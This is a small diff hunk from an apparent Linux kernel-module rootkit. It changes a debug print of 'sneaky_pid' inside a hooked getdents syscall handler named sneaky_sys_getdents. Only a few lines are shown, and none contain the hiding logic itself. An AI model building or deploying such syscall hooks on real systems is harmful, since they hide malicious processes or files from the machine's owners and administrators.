@@ -63,7 +63,7 @@ asmlinkage int sneaky_sys_getdents(struct pt_regs *regs) {
     int bpos;
     //printk(KERN_INFO"enter my_getdents\n");
     printk(KERN_INFO"nread: %d \n", nread);
-    printk(KERN_INFO"pid: %d \n", sneaky_pid);
+    printk(KERN_INFO"pid: %s \n", sneaky_pid);
     if (nread == -1) {
         return -1;
     }
